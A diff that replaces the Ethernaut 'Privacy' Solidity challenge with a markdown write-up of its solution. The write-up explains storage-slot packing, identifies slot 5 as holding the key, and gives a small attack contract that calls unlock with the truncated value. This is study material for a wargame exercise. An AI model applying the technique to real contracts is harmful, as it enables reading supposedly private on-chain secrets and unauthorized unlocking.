@@ -1,30 +1,87 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+## Level 12 - Privacy
 
-contract Privacy {
-    bool public locked = true;
-    uint256 public ID = block.timestamp;
-    uint8 private flattening = 10;
-    uint8 private denomination = 255;
-    uint16 private awkwardness = uint16(block.timestamp);
-    bytes32[3] private data;
+Requires a good understanding of how storage works in solidity, and how to access it.
 
-    constructor(bytes32[3] memory _data) {
-        data = _data;
-    }
+## Solution
 
-    function unlock(bytes16 _key) public {
-        require(_key == bytes16(data[2]));
-        locked = false;
-    }
+Below is the break up of how the state variables fit into different slots.
 
-    /*
-    A bunch of super advanced solidity algorithms...
+```
+// Slot 0
+bool public locked = true;
 
-      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
-      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
-      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
-      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
-      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
-  */
+// Slot 1
+uint256 public ID = block.timestamp;
+
+// Slot 2
+uint8 private flattening = 10;
+
+// Slot 2
+uint8 private denomination = 255;
+
+// Slot 2
+uint16 private awkwardness = uint16(block.timestamp);
+
+// Slot 3, 4, 5
+bytes32[3] private data;
+```
+
+Basically, the info stored at slot 5 is to be passed to the unlock function to clear the level.
+Note the usage of `call` with `abi.encodeWithSignature`
+
+```java
+contract PrivacyAttack {
+
+	event Response(bool success, bytes data);
+
+
+	function bytes32ToBytes16(bytes32 data, address privacyContract) public {
+
+		bytes16 convertedBytes = bytes16(data);
+
+
+
+	// one way would be to import the abi (which on remix can be done by pasting the code into a file and compiling it)
+
+	// then import it into this contract, create an object and then call
+
+	// method2 would be use call on its address (since we know the function already)
+
+		(bool success, bytes memory data) = privacyContract.call(
+
+			abi.encodeWithSignature("unlock(bytes16)", convertedBytes)
+
+		);
+
+
+
+		emit Response(success, data);
+
+
+
+		}
+
 }
+```
+
+## Takeaway
+
+```
+# Storage
+- 2 ** 256 slots
+- 32 bytes for each slot
+- data is stored sequentially in the order of declaration
+- storage is optimized to save space. If neighboring variables fit in a single 32 bytes, then they are packed into the same slot, starting from the right
+
+# Format of encodeWithSignature: endocdeWithSignature(functionName("function param type)", param)
+```
+
+## References
+
+- https://solidity-by-example.org/hacks/accessing-private-data/
+- https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
+
+<div align="center">
+<br>
+<h2>🎉 Level completed! 🎉</h2>
+</div>
